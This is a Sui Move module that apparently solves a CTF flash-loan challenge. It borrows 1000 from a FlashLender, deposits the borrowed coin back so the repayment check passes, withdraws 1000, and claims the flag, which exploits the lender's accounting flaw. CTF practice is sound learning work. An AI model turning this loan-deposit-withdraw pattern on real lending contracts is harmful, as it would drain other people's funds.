module solve::m {
    use movectf::flash::{Self, FlashLender};
    use sui::tx_context::{TxContext};

    entry public fun do(self: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(self, 1000, ctx);
        flash::deposit(self, coin, ctx);
        flash::check(self, receipt);
        flash::withdraw(self, 1000, ctx);

        flash::get_flag(self, ctx);
    }
}